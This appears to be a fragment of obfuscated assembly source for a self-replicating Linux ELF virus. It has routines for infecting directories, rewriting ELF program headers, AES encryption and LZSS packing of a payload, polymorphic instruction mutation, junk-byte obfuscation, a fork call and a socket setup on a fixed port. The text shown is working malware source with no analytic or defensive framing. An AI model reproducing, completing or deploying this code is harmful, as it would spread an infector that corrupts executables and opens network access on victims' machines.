    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    jmp         $+4
db 0x00, 0x30
    jl          ..@evzyibI2I4iy
    jge         ..@evzyibI2I4iy
..@PWJQK8R9o7Id:
    mov         rbx, rbx
    jmp         ..@hMW3KbBaIi9y
..@XG9DmpxOn45m:
    push        rbx
    jmp         $+5
db 0x0c, 0xc2, 0x6e
    jmp         $+5
db 0x4b, 0xce, 0xa2
    jmp         ..@4W1jwsTLKIP3
..@1dvqf8bOnbIP:
    mov         BYTE [rdi+11], 90h
    je          ..@DlBKXTXjWrh0
    jne         ..@DlBKXTXjWrh0
..@wFJF4ByPugsT:
    movv        rax, 0x00
    rep         stosb
    mov         r2, QWORD [rsp+_UPDATASIG_OFF.meta_ptr+0x20]
    jb          ..@vArVdgKrwq9i
    jae         ..@vArVdgKrwq9i
..@X9CJcY2lLwx2:
%ifdef X86_64
    mov         rdx, rdx
    mov         edx, DWORD [rdi]
    and         edx, 0fffff8f8h
    cmp         edx, 90905850h
    je          ..@3VbMPYOt5tFG
%endif
    jl          ..@TXUOBHkQaV1i
    jge         ..@TXUOBHkQaV1i
..@qxqOSoktjUj2:
    xchg        rax, rax
    mov         rsi, QWORD [rsp+bytes]
    jmp         ..@pfK0MFHnoKWz
..@ntf4sytF8uNK:
    mov         rdi, m6
    add         rdi, virus_len-_start
    mov         rsi, m7
    jmp         $+4
db 0x21, 0x79
    jmp         $+5
db 0x18, 0x12, 0x01
    jmp         ..@T33KtfhvIoYI
..@Vqd3I4qoLycs:
    mov         rax, rax
    mov         rsp, rsp
    jmp         ..@U2okjH8Ioswy
..@ERoUqbZ9Csak:
    add         rdi, key-_start
    lea         rsi, [rsp+_PAYLOAD_OFF.key]
    mov         ecx, 0x8
    jmp         $+5
db 0x78, 0xf3, 0x8b
    je          ..@YMgI9xsbuOMe
    jne         ..@YMgI9xsbuOMe
..@qU9Gtvx6Emq9:
%ifdef X86_64
    push        rbx
%endif
    jmp         $+4
db 0xf3, 0x68
    jl          ..@WEGT0rPiRw5r
    jge         ..@WEGT0rPiRw5r
..@OE44EoMWmYEa:
    push        rbx
    jb          ..@FeX9NoxfSIZR
    jae         ..@FeX9NoxfSIZR
..@e0uEKOcO6aNZ:
    mov         rsi, rsi
    jmp         $+5
db 0xab, 0x8f, 0x2b
    jb          ..@D8Ck1jGsYECi
    jae         ..@D8Ck1jGsYECi
..@2ET21Fby8bP3:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    jmp         $+4
db 0x5f, 0xb1
    jmp         ..@8AeMIF8yRX6z
..@9Jmv7g122HmV:
    push        rsi
    push        rcx
    xor         rax, rax
    mov         rdi, rsi
    jmp         $+5
db 0xf9, 0xad, 0x55
    js          ..@p8dj0pvUBiDE
    jns         ..@p8dj0pvUBiDE
..@ft3gOC4Z8wtU:
    ret
    jmp         $+4
db 0xcb, 0xf8
    jmp         $+4
db 0x6c, 0x1b
    jb          CreatePayload
    jae         CreatePayload
..@2t4YZuFFVd08:
    mov         bl, dl
    jmp         ..@51UfFJAFAElh
..@sgDBckPohIvb:
    ret
    jmp         $+3
db 0xf9
    js          ..@KL2hLTP2onaO
    jns         ..@KL2hLTP2onaO
..@jx1RDw0XG0Cb:
    ret
    jmp         $+5
db 0x04, 0xef, 0xee
    jmp         $+3
db 0x72
    jmp         Aes256Encryption
..@iBC4lB95o5Pw:
    mov         rdi, rdi
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    mov         eax, 0x20
    jmp         $+4
db 0x85, 0x6d
    jmp         $+4
db 0xd1, 0x2c
    jl          ..@T8Loyam7CoDt
    jge         ..@T8Loyam7CoDt
..@sw2fGQheBVQ1:
    xchg        rbx, rbx
    xor         rcx, rcx
    xor         rsi, rsi
    xor         rax, rax
    jmp         ..@bpBbmjcefcJt
..@ZHiVnqiCdNhn:
    mov         DWORD [r5+file.filefd], 0x00
    mov         QWORD [r5+file.filesize], 0x00
    jmp         ..@jHqkrpUhFBz2
..@7HrcPnahZaDb:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    jl          ..@Vk8ullgq1VSQ
    jge         ..@Vk8ullgq1VSQ
..@X2vPPF2naCLn:
    mov         rdi, m7
    mov         ecx, PADDING
    mov         eax, 0x00
    rep         stosb
    jl          ..@6uEQK8aHbrTu
    jge         ..@6uEQK8aHbrTu
..@RgeXhuRdTTu0:
    call_vsp    ExitProgram
    jmp         $+5
db 0xbb, 0x65, 0x21
    jmp         ..@po2lz8fa5reh
..@B4FJlzoW2MBg:
    mov         rax, r2
    jmp         $+5
db 0x2a, 0xcb, 0x03
    jmp         ..@QmrqSQJa1bZv
..@3PjFBed1B5sL:
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    jmp         $+3
db 0x93
    jb          ..@nvCg32xt3SVZ
    jae         ..@nvCg32xt3SVZ
..@EQQ31PvSyGJU:
    push        rdx
    pop         rdx
    jmp         $+5
db 0x4a, 0x7f, 0x75
    jmp         $+4
db 0x4a, 0xf6
    je          ..@Anmckvvu2EmE
    jne         ..@Anmckvvu2EmE
..@gs3tvc5S9lqa:
    mov         rax, 0xff
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    jmp         $+5
db 0xaa, 0x46, 0xa3
    jmp         $+5
db 0xb8, 0xc1, 0xfb
    jb          ..@yaDBWRSCHV3D
    jae         ..@yaDBWRSCHV3D
..@2JZHv8BVS9fe:
%ifndef ENABLE_DEBUGGING
    push        rbx
    mov         rsi, rsi
    pop         rbx
    xor         rax, rax
    xor         r2, r2
%endif
    jl          ..@ALNWva3Ujrgw
    jge         ..@ALNWva3Ujrgw
..@lvjtM5e6W9vy:
    sub         rsp, _LZSSE_OFF_size
    jmp         $+5
db 0x11, 0xf1, 0x50
    jmp         $+5
db 0x7a, 0x56, 0x70
    jl          ..@ZUP43WJoR2fl
    jge         ..@ZUP43WJoR2fl
..@XROwkKMgKxf4:
    jmp         ..@YtnYaSniTSrM
    jl          ..@8rIPxyxlhXCP
    jge         ..@8rIPxyxlhXCP
..@NBa8zaMdSHkX:
    xor         r2, r2
    jmp         $+4
db 0xd0, 0xf5
    jmp         $+4
db 0xb7, 0xa8
    jl          ..@MRB869S9nHeM
    jge         ..@MRB869S9nHeM
..@pzyD6UmuIL0g:
    push        rdx
    jmp         $+4
db 0xef, 0x1e
    jb          ..@tmri0f6B3kcF
    jae         ..@tmri0f6B3kcF
..@fACBqkaLPHs1:
    push        rdx
    je          ..@Ck1j1zopWJxj
    jne         ..@Ck1j1zopWJxj
UpdateSignature:
    jmp         ..@ZNgOpIESDF9i
..@1sIsQVUnhTvx:
    xor         rdx, rdx
    jmp         ..@VpG3jGXThKZT
..@MmBW7ez7SC83:
    xchg        rcx, rcx
    mov         bl, dl
    push        rbx
    jmp         $+5
db 0x8a, 0x44, 0x9b
    jb          ..@9wh8Bh5U58gB
    jae         ..@9wh8Bh5U58gB
..@eQmyi8ivhu4q:
    cmp         WORD [r1], './'
    jl          ..@PaJYkmPSo2ag
    jge         ..@PaJYkmPSo2ag
..@YsJMFZlEcxld:
%ifdef X86_64
    jz          ..@S8nQycRDp9wX
    cmp         dx, 9000h
%endif
    jmp         $+5
db 0x77, 0x6b, 0x6a
    jmp         ..@D8bkKdwG0sq0
..@ODc7wmF1uU8E:
    jle         ..@IqyIJNVLcwnu
    mov         r5, r3
    jmp         $+5
db 0x95, 0x79, 0xb0
    jmp         ..@vM9NJNVIRxzJ
..@ttep6trMf4Ly:
    xor         dl, BYTE [rsp]
    and         dl, 1110b
    or          dl, 80h
    shl         edx, 8
    jl          ..@7YvQtUXrQZVX
    jge         ..@7YvQtUXrQZVX
..@qWx3NztNajIy:
    je          ..@thFYj1In6xMU
    jl          ..@OTCYkpPXHIPg
    jge         ..@OTCYkpPXHIPg
..@ngrXHKaim4Px:
%ifdef X86_32
    mov         bx, 0089h
%endif
    jmp         $+4
db 0xfc, 0xf8
    jmp         $+3
db 0xcc
    jmp         ..@NF08xmUoDtd4
..@QtII4L1aYDA2:
    xor         rdx, rdx
    jmp         $+5
db 0x19, 0x5b, 0xf4
    js          ..@lIbzWCCJtHVC
    jns         ..@lIbzWCCJtHVC
..@vQXlvOvwbPya:
    xor         rax, rax
    je          ..@cYWi9vlF3NaK
    jne         ..@cYWi9vlF3NaK
..@LCE56Fpw4Qkr:
    and         al, 111b
    je          ..@wlz7BATXbym5
    jne         ..@wlz7BATXbym5
..@MNCPEWn7w6vD:
    mov         ebx, DWORD [rsi]
    not         ebx
    add         ebx, 1
    mov         DWORD [rsi], ebx
    jmp         ..@3mvDoHbMO4pb
    jmp         ..@sEpsjAWEdXVa
..@NlhTaHKOaVpr:
    sub         rsp, 0x20
    movr        rdi, rsp
    movv        rcx, 0x20
    xchg        rdx, rdx
    mov         rsp, rsp
    jl          ..@wFJF4ByPugsT
    jge         ..@wFJF4ByPugsT
..@RGx3WWFH7DuM:
    add         rsp, _NBF_OFF_size
    jmp         ..@ByuMOzOnEJrk
..@mjeWbihsrggM:
    mov         QWORD [r2+p_h.p_filesz], r4
    mov         QWORD [r2+p_h.p_memsz], r4
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    push        rsi
    jmp         $+5
db 0xe1, 0x55, 0xf0
    js          ..@LG9UTkDsOlhi
    jns         ..@LG9UTkDsOlhi
..@q3Cbtz1Fb4jE:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    push        rdi
    pop         rdi
    test        al, al
    jnz         ..@GRXiEW7aiBex
    jmp         ..@RGp0JPK4ey6a
..@Sed0vnx10TZF:
    add         ecx, 1
    jmp         $+3
db 0x1b
    jb          ..@7D2AVLXvx8tt
    jae         ..@7D2AVLXvx8tt
..@6V8ggEuL5Yo1:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jl          ..@DkQ0BsT18K9w
    jge         ..@DkQ0BsT18K9w
..@oqpoZ0aUhK8f:
%ifndef ENABLE_DEBUGGING
    push        rdi
%endif
    jmp         $+4
db 0xe7, 0x56
    jmp         $+4
db 0xcf, 0x68
    jb          ..@R8PpF6y3g2wE
    jae         ..@R8PpF6y3g2wE
..@pj2CWyWGes9V:
%ifndef ENABLE_DEBUGGING
    pop         rsi
%endif
    jmp         $+3
db 0x62
    jb          ..@IogqjLwLc1xl
    jae         ..@IogqjLwLc1xl
..@VpG3jGXThKZT:
    mov         dl, BYTE [rbx]
    jmp         ..@Vf1C2TR3Mhtk
..@9pwDhZaUxfmM:
%ifdef X86_64
    je          ..@3VbMPYOt5tFG
    mov         edx, DWORD [rdi]
    and         edx, 0fff8f8ffh
%endif
    jmp         $+4
db 0xe7, 0x0e
    jmp         $+5
db 0x2a, 0x9b, 0xa7
    je          ..@FLnc8j2YZdrY
    jne         ..@FLnc8j2YZdrY
..@iLNYbCm9jBR7:
    xor         rax, rax
    je          ..@sgDBckPohIvb
    jne         ..@sgDBckPohIvb
..@358E0vO2pJO2:
%ifdef X86_64
    jne         ..@sw2fGQheBVQ1
%endif
    jmp         $+4
db 0xd4, 0x27
    jmp         ..@QlqorZcy4xwC
..@NlmB8yq5urM3:
    jmp         ..@qTjVhWrcA0J5
    jb          ..@99Q6QG4UIoFZ
    jae         ..@99Q6QG4UIoFZ
..@V9Y3jQoMHcf9:
%ifndef ENABLE_DEBUGGING
    push        QWORD 0x0
%endif
    jb          ..@IA5qRoY7bD6E
    jae         ..@IA5qRoY7bD6E
..@M8JVjAmV8TLk:
    leave
    jmp         $+5
db 0xaf, 0xee, 0x96
    jb          ..@lRXpUBt5DHt0
    jae         ..@lRXpUBt5DHt0
..@BmyszZPMEkOq:
    movdqu      [rsi+rcx], xmm0
    xchg        rbx, rbx
    add         rcx, 0x10
    jmp         $+4
db 0x22, 0xef
    jmp         $+4
db 0x77, 0xd9
    jmp         ..@wLD29XR6ActH
..@DhU2vxHskT4J:
    jmp         ..@IqyIJNVLcwnu
    jmp         $+5
db 0x2c, 0x05, 0xc6
    jmp         $+4
db 0xcf, 0x24
    jmp         $+5
db 0xc8, 0xa7, 0x72
    jmp         $+5
db 0xc6, 0xce, 0xd7
    jmp         $+5
db 0x3c, 0xf4, 0x2b
    jmp         $+5
db 0x76, 0xba, 0xa7
    jmp         ..@8zSaA7RMW3Rb
..@kCr7cHdqSIrc:
    pop         r2
    jmp         $+5
db 0xe8, 0xe8, 0x56
    jmp         $+5
db 0xe5, 0x2a, 0x81
    jmp         ..@ju0aRq2lMYO1
..@GyTat5glRNPc:
    cmp         rax, 0x00
    jmp         $+4
db 0x4e, 0x5a
    js          ..@tDUF3XhQG4kB
    jns         ..@tDUF3XhQG4kB
..@qHRcbybFHoB4:
    je          ..@8rIPxyxlhXCP
    cmp         dl, 81h
    sete        al
    push        rsi
    je          ..@V4f7ofBIN9Yb
    jne         ..@V4f7ofBIN9Yb
..@ELw8CQHqp5XF:
    mov         QWORD [rsp+_MUTA_OFF.key], r3
    jmp         ..@DvmYhBrIUMwx
..@Y9GsjBOQ6Ngy:
    mov         rax, rax
    xchg        rsi, rsi
    jmp         $+3
db 0x64
    jmp         ..@J8CHzKxVUBNB
ConvertMoveZeroToXor:
    jmp         ..@vAMaGwOCOk0L
..@NUUNUHrgLb9F:
    push        rdx
    jl          ..@fScEuhSHAxfe
    jge         ..@fScEuhSHAxfe
..@jbrRJqSEbYYd:
%ifdef X86_64
    push        rsi
%endif
    jb          ..@LTxyN9x0Fs5F
    jae         ..@LTxyN9x0Fs5F
..@HHhSjcM9JncM:
    jle         ..@evzyibI2I4iy
    js          ..@Mjmgh3R4cnSn
    jns         ..@Mjmgh3R4cnSn
..@CqKNXw1wQOHB:
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    js          ..@aWZGYQJCtsNx
    jns         ..@aWZGYQJCtsNx
..@SSRObxD4jSsD:
    xchg        rax, rax
    jmp         $+4
db 0x9e, 0x38
    jb          ..@MO3HrD0JdRhF
    jae         ..@MO3HrD0JdRhF
..@RKmNITXZGGnW:
    jl          ..@f2zq1ZtKVQfm
    jmp         ..@LH7aFX8SHc5D
..@W4n0yKw3mhJK:
%ifdef X86_64
    cmp         edx, 90c03148h
%endif
    jb          ..@nJRbiOINfoZ8
    jae         ..@nJRbiOINfoZ8
..@BmJA1tqq3vyE:
%ifdef X86_64
    or          dl, 100b
%endif
    jmp         ..@RWRfh0dskw1l
..@kbZOQNCIMFf0:
%ifdef X86_64
    or          rdi, rax
%endif
    jb          ..@qU9Gtvx6Emq9
    jae         ..@qU9Gtvx6Emq9
..@fAZy8aRiviUl:
    and         edx, 0ffffh
    mov         rbx, rbx
    jmp         ..@rmuQvzEjiT7l
WORDToDWORDASCII:
    jmp         ..@eP9Pp8z4bGXD
..@PlxTmGl3ii11:
    mov         dx, WORD [rdi]
    jmp         ..@xl6L2nvLftCz
..@tqyKArcr6iao:
    jz          ..@K5dahWlbKrYZ
    jl          ..@e0uEKOcO6aNZ
    jge         ..@e0uEKOcO6aNZ
..@WGAqZVQvGhVO:
    mov         r2, signature_len
    jb          ..@bXleCoS5JS4L
    jae         ..@bXleCoS5JS4L
..@JIwYDX39COM8:
    pop         rcx
    pop         rsi
    xor         rax, rax
    jmp         $+4
db 0x08, 0xff
    jmp         ..@xmDA9qtYuVEW
..@qfi9rc5uM05A:
    mov         rsp, rsp
    jl          ..@FgWbiJB9ooCk
    jge         ..@FgWbiJB9ooCk
..@Y6wPGi54f1Hm:
    mov         BYTE [rsi], 2dh
    jmp         $+4
db 0xb7, 0x93
    je          ..@y2bzkDEGJ8gY
    jne         ..@y2bzkDEGJ8gY
..@QFM6wFZYAX1i:
    mov         rsi, QWORD [rsp+_AESE_OFF.startaddr]
    jb          ..@58XkK2iApQsx
    jae         ..@58XkK2iApQsx
..@YcT2ZoUsywmz:
    ret
    jmp         $+5
db 0xa4, 0x92, 0x35
    jl          ConvertDoubleJumpToJump
    jge         ConvertDoubleJumpToJump
..@tIy3Ab5iZYpn:
    cmp         r1, 0x00
    jg          ..@kKkjwJO0fIuY
    jmp         $+3
db 0x13
    jmp         $+3
db 0xdb
    jmp         $+4
db 0xf5, 0x3e
    jb          ..@xxhjXdoSpDDP
    jae         ..@xxhjXdoSpDDP
..@ijvpO5H3vfYy:
    mov         r2w, WORD [r1+e_h.e_phnum]
    jmp         $+4
db 0x70, 0xa9
    jl          ..@UN5R4U3oqI5B
    jge         ..@UN5R4U3oqI5B
..@7Trw1ohlUOtc:
    xor         rax, rax
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    jmp         ..@vi09JwCOP2LR
..@3cqUy7fXbEn9:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    jmp         $+4
db 0x3b, 0xe5
    js          ..@gVi7fJ2gtsAs
    jns         ..@gVi7fJ2gtsAs
..@kKkjwJO0fIuY:
    mov         r1, QWORD [r5+file.filename]
    push        rbx
    pop         rbx
    mov         rsi, rsi
    cmp         BYTE [r1], '/'
    jb          ..@NryjT0iDKSwF
    jae         ..@NryjT0iDKSwF
..@TYYoGOR4frKa:
    mov         rdi, rdi
    mov         rsp, rsp
    push        rdi
    jmp         ..@tTfQ9ro8mzo3
..@eRoiS8OXKmQL:
    push        rdx
    jmp         $+3
db 0xf1
    jmp         ..@bJVfVjmiXldM
..@TaN4Iq1o7Lj7:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+3
db 0x17
    js          ..@7ZBmeOOOT6au
    jns         ..@7ZBmeOOOT6au
..@mDYAqODNm7tO:
    ret
    jmp         $+5
db 0x28, 0x96, 0xd1
    jmp         IsNum
..@51UfFJAFAElh:
    and         bl, 111b
    jmp         $+3
db 0x75
    js          ..@61vccviur7cD
    jns         ..@61vccviur7cD
..@3VbMPYOt5tFG:
    xor         rsi, rsi
    xor         rax, rax
    mov         eax, DWORD [rdi]
    xor         rdi, rdi
    jmp         ..@mnUzIxoJSPfq
..@XqZdHpX8Yevf:
%ifdef X86_64
    pop         rcx
    pop         rsi
    jz          ..@t05NebrBROmj
    mov         rax, rax
%endif
    jmp         $+4
db 0x1c, 0x9d
    jmp         $+4
db 0x2e, 0x22
    jb          ..@CENV1x0dgrqo
    jae         ..@CENV1x0dgrqo
..@LmGileC6lGRO:
    mul         rbx
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    add         rdi, rax
    jmp         $+3
db 0x64
    jmp         $+3
db 0x95
    je          ..@mMHq8oFNB1Ce
    jne         ..@mMHq8oFNB1Ce
..@chBgFDsMHk0u:
    cmp         BYTE [r1+4], ELFCLASS
    jmp         $+3
db 0x03
    jmp         ..@QQU6XlGFotl5
..@urKplzDM1Hbh:
%ifdef X86_64
    mov         edx, 48h
%endif
    jmp         $+5
db 0x78, 0xc4, 0x7a
    jl          ..@oA58BSgBgXcH
    jge         ..@oA58BSgBgXcH
..@fIYET2eJ00Dq:
%ifdef X86_64
    and         edx, 0ffc0fffah
%endif
    je          ..@W4n0yKw3mhJK
    jne         ..@W4n0yKw3mhJK
..@yaDBWRSCHV3D:
    test        al, al
    jz          ..@24M3UDKSlWdI
    js          ..@57dEqTpjUIwH
    jns         ..@57dEqTpjUIwH
..@m7hBQq0y3V2g:
%ifdef X86_32
    int         0x80
%endif
    jmp         ..@TaN4Iq1o7Lj7
..@hJsBysElndlZ:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    jmp         $+4
db 0x29, 0xa4
    jmp         ..@HE6RR0FETMUb
..@4EBpVhincLAp:
    and         edx, 111b
    jmp         ..@xbS5QPBS6qYf
..@kevalbgCh927:
    add         rbx, 1
    mov         rsi, rsi
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jb          ..@nz786sQpWMNH
    jae         ..@nz786sQpWMNH
..@2QSjaDhfeh7U:
    add         eax, 0x30
    jmp         $+4
db 0xb2, 0xd2
    jmp         ..@w2N4JqcJG42o
..@wLD29XR6ActH:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    jmp         ..@m0hseK6n64f3
..@tLXznyibnrr9:
    call        Strcpy
    js          ..@js5A5YjwuDGs
    jns         ..@js5A5YjwuDGs
..@cuH9xsL3veqa:
    mov         rax, rax
    jmp         $+3
db 0xb6
    jmp         $+4
db 0xbc, 0xd4
    jmp         ..@jil0xsqJpn8I
..@ImlEG4UbHxSa:
    add         r4, rax
    jl          ..@FkWdwILf36Ba
    jge         ..@FkWdwILf36Ba
..@BYMLaYmwIt27:
    pop         rdi
    jmp         $+5
db 0x5d, 0xd4, 0x9d
    jmp         $+3
db 0x48
    jmp         ..@P5J99ZrwKLvw
..@0HJlf22vNGgl:
    mov         rbp, rbp
    cmp         r4, 0x8
    jl          ..@1jjvYsdzX5Hn
    add         rsp, 0x20
    je          ..@nFmCmFVdwlC8
    jne         ..@nFmCmFVdwlC8
..@8AeMIF8yRX6z:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    add         rdi, rax
    jmp         $+5
db 0x78, 0x7c, 0x6a
    js          ..@vQXlvOvwbPya
    jns         ..@vQXlvOvwbPya
..@0LQaI9DTHoBZ:
%ifdef X86_32
    jnz         ..@7871YsfeDySB
%endif
    jmp         ..@S8nQycRDp9wX
..@xb1HWMv2yD7v:
    pop         rdx
    jmp         $+5
db 0xac, 0x54, 0x61
    jmp         $+4
db 0x4a, 0x4e
    jmp         ..@cxC4dYcjPL8u
..@C29an8t6RpjR:
%ifdef X86_64
    mov         edx, DWORD [rdi]
    and         edx, 0fffff8ffh
%endif
    jl          ..@DxEJKxBx8UyH
    jge         ..@DxEJKxBx8UyH
..@BYXepFB9gLHm:
    call        InfectDirectory
    jmp         $+4
db 0x44, 0x2b
    jl          ..@UhuHyYbjnd1X
    jge         ..@UhuHyYbjnd1X
..@ftKh8pWOmzyf:
    mov         r1, r5
    add         r1, r4
    cmp         BYTE [r1], 0x00
    jmp         ..@2nTHrDSU4lBA
..@cxC4dYcjPL8u:
    xor         r1, r1
    jmp         $+5
db 0x79, 0x75, 0x96
    je          ..@RgeXhuRdTTu0
    jne         ..@RgeXhuRdTTu0
..@sMKXeQB5Yasn:
%ifndef ENABLE_DEBUGGING
    push        rax
    pop         rax
    jl          ..@gvR834lDN6hJ
%endif
    jmp         ..@eroJriVyYHlj
..@Ny4ZIbltlOIi:
    pop         rbx
    jmp         $+5
db 0xfb, 0x2f, 0x2a
    jmp         $+3
db 0x75
    jmp         $+3
db 0x3a
    je          ..@HOyBiLls6QdJ
    jne         ..@HOyBiLls6QdJ
..@OdNtn6gJNkEb:
    mov         rdi, rdi
    xchg        rbx, rbx
    mov         r2, m5
    jmp         $+5
db 0x90, 0xa0, 0x38
    jmp         $+3
db 0x37
    jmp         ..@kQpPcyLifyvX
..@XZipEG8hhrIo:
    and         edx, 000000f8h
    cmp         dl, 0b8h
    jne         ..@pvlZ8vgXBRN0
    jmp         ..@oAXcG29MbWo2
..@xhje092mO9gB:
%ifndef ENABLE_DEBUGGING
    mov         rax, rax
    mov         eax, SYS_SOCKET
%endif
    jmp         $+4
db 0xbf, 0xa3
    js          ..@oa4vZ4vajOfF
    jns         ..@oa4vZ4vajOfF
..@8HrabdZ1Md4z:
    ret
    jmp         $+4
db 0xec, 0xfd
    jmp         ..@kKkjwJO0fIuY
..@3Q2mv8BTGULc:
    push        r1
    jmp         $+4
db 0x32, 0x78
    jb          ..@38sJg5yiW0UP
    jae         ..@38sJg5yiW0UP
..@fNDKlSogRC08:
    call        UpdateSignature
    mov         r1, m6
    add         r1, non_packed_len+PADDING
    jmp         $+3
db 0x60
    jmp         $+5
db 0x79, 0x87, 0xe2
    jmp         ..@ITL5IGVOOseQ
..@jkTMZHWBDPF9:
    mov         dx, WORD [rdi+5]
    js          ..@l2wC8nseJgoU
    jns         ..@l2wC8nseJgoU
..@agMifGHxCrgS:
    mov         r1, m6
    jmp         $+5
db 0x35, 0xf5, 0x05
    jmp         $+3
db 0xca
    jmp         $+4
db 0xa9, 0x9d
    jl          ..@FLZaJScZeNFW
    jge         ..@FLZaJScZeNFW
..@ooa8OaoCpFoQ:
    xchg        rdx, rdx
    je          ..@BPdSCoUhtAof
    jne         ..@BPdSCoUhtAof
..@qLuf1Y1MpArI:
    or          QWORD [r1+e_h.e_entry], 1b
    mov         rdi, rdi
    jmp         ..@s48FnoxXlLq9
..@JKKnFYkwDyEJ:
    call        ConvertMoveToPushPop
    jmp         $+4
db 0x2f, 0x3a
    je          ..@gs3tvc5S9lqa
    jne         ..@gs3tvc5S9lqa
..@ET7On1ReKwe7:
    xchg        rdx, rdx
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    jb          ..@PlMJxd994GXp
    jae         ..@PlMJxd994GXp
..@4OWDHuxieycO:
    pop         rdi
    jmp         $+5
db 0x9c, 0x2c, 0x85
    jmp         $+5
db 0xf8, 0x2b, 0x68
    jmp         ..@S8VVI7PoVgbs
..@8f9r31zUkniY:
    mov         rax, QWORD [rsi+rcx+bytes]
    and         rax, DF_1_PIE
    test        eax, eax
    mov         rsi, rsi
    mov         rax, rax
    jmp         $+5
db 0xca, 0x8b, 0x11
    jmp         ..@0Q6ql4W7tmqs
..@0fiIu6COUpml:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_FORK
    xchg        rbx, rbx
    mov         rdx, rdx
    syscall
%endif
    jmp         $+4
db 0xd8, 0xa6
    jb          ..@DIfzTnPTQ6jI
    jae         ..@DIfzTnPTQ6jI
..@W8fDPWsZYGRD:
%ifdef X86_64
    xor         rdi, rdi
    xor         rdx, rdx
%endif
    jb          ..@Nt7iPSSv0Ptv
    jae         ..@Nt7iPSSv0Ptv
..@GoDzI3FzIKZ9:
    sub         ecx, 1
    js          ..@0x4e9fQm7C4s
    jns         ..@0x4e9fQm7C4s
..@c0AHgfPEO1OW:
    xor         rax, rax
    jmp         $+5
db 0xfa, 0xc6, 0x47
    jmp         ..@HNopTPY5OgN4
..@vi09JwCOP2LR:
    add         r1, rax
    sub         r1, 1
    cmp         BYTE [r1], DT_DIR
    jne         ..@OWPLnCHNh4r5
    jmp         $+5
db 0x4e, 0xe0, 0x06
    je          ..@q0AIP3uR2TQK
    jne         ..@q0AIP3uR2TQK
..@n4N6UxBWLzDu:
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    jl          ..@l38qhbFxkQUe
    jge         ..@l38qhbFxkQUe
..@4XWONgpWAP74:
    mov         BYTE [r1], 0x00
    jb          ..@RGx3WWFH7DuM
    jae         ..@RGx3WWFH7DuM
..@pfK0MFHnoKWz:
    add         rsi, rcx
    xor         rdx, rdx
    jmp         $+5
db 0x4f, 0x20, 0x30
    jmp         $+4
db 0x02, 0xe2
    js          ..@fLFwnivdek04
    jns         ..@fLFwnivdek04
..@Anmckvvu2EmE:
    jmp         ..@9Ryq9lQLJ5Nx
    je          ..@GxtQtVk6t89u
    jne         ..@GxtQtVk6t89u
..@2Z4swjLqutRn:
    VAR         packed, dirs_tmp
    jmp         $+4
db 0xf4, 0x50
    jmp         $+5
db 0x3e, 0xa9, 0x60
    jmp         ..@0cuwo91qh6ib
..@ejHB3PlfjiGZ:
    xor         r4, r4
    jmp         $+3
db 0xb4
    jmp         $+3
db 0x77
    js          ..@eixHI4M5Nkd7
    jns         ..@eixHI4M5Nkd7
..@IA5qRoY7bD6E:
%ifndef ENABLE_DEBUGGING
    push        WORD 0x5c11
%endif
    js          ..@ftgTyevRnTSV
    jns         ..@ftgTyevRnTSV
..@YJjyQ2lZsd2i:
    pop         rsi
    js          ..@z56bjINyDxnA
    jns         ..@z56bjINyDxnA
..@093J7eCbeyMO:
    mov         rcx, signature_len
    mov         rdi, QWORD [r5+file.fileptr]
    mov         eax, 0x0
    je          ..@FSe2Kb0yv4vi
    jne         ..@FSe2Kb0yv4vi
..@MQbDMbIebK9n:
    mov         r2, 1
    jl          ..@E1VXnuM9KxMg
    jge         ..@E1VXnuM9KxMg
..@CqYFFV5CopHz:
    xor         rdx, rdx
    jmp         $+3
db 0xe1
    jmp         ..@iPCDMwT22hA5
..@U2okjH8Ioswy:
    mov         rbp, rbp
    xchg        rsi, rsi
    mov         rbx, rbx
    jmp         ..@gM4zo8IJwwLF
..@evFhwfTE4scP:
%ifdef X86_64
    mov         rsp, rsp
    and         edx, 0f8fff8ffh
    cmp         edx, 58415041h
    je          ..@3VbMPYOt5tFG
%endif
    jmp         $+5
db 0xdc, 0x96, 0x81
    jb          ..@mO5IRcbTNoyR
    jae         ..@mO5IRcbTNoyR
..@vAMaGwOCOk0L:
    push        rsi
    push        rcx
    mov         rdi, rsi
    xchg        rsi, rsi
    xchg        rdx, rdx
    jmp         $+5
db 0xe6, 0x63, 0x89
    jl          ..@LJwe2QEm5Pls
    jge         ..@LJwe2QEm5Pls
..@QjER0zyEdYUr:
    rep         movsb
    cld
    jmp         $+4
db 0xcc, 0x4a
    je          ..@VGWhSM9XyovC
    jne         ..@VGWhSM9XyovC
..@iIzUR5cC5Pxr:
%ifdef X86_32
    cmp         edx, 0c089h
%endif
    jmp         ..@zKk5DtADWxjG
..@zE0FEX9ifOTo:
    pop         rsi
    xor         rax, rax
    jl          ..@rNrxT55HcOBu
    jge         ..@rNrxT55HcOBu
..@3rSSyPn2atoD:
    xor         rax, rax
    jmp         $+5
db 0x03, 0xf0, 0x06
    je          ..@2LMvRXojCLPo
    jne         ..@2LMvRXojCLPo
..@Zxdb9DCbKHjI:
    push        rax
